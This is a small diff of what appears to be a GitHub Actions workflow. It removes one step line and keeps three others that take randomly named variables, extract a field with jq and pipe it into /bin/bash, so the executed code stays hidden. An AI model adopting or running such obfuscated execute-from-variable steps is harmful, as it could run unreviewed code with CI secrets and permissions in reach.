@@ -24,7 +24,6 @@ jobs:
           echo $cl2 | jq -r .eiii9 | /bin/bash
           printf '%s' "$me9366" | jq -r .s7 | /bin/bash
           echo $rgx4 | jq -r .oderi25 | /bin/bash
-          echo $mhwf34338 | jq -r .r816 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
